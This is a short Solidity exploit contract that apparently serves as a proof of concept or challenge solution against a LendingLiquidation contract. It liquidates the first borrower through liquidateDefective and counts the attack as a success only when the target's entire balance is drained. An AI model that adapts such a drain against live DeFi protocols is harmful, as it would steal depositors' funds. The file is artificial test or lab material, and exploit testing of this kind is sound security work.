// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {LendingLiquidation} from "../src/LendingLiquidation.sol";

contract ExploitModule {
    LendingLiquidation public targetContract;

    constructor(address _target) payable {
        targetContract = LendingLiquidation(payable(_target));
    }

    function runExploit() external payable {
        // Get the first borrower
        address firstBorrower = targetContract.getBorrowers()[0];

        // Liquidate the first borrower
        targetContract.liquidateDefective(firstBorrower);

        // Check if the exploit was successful
        require(address(targetContract).balance == 0, "Exploit failed");
    }

    receive() external payable {}
}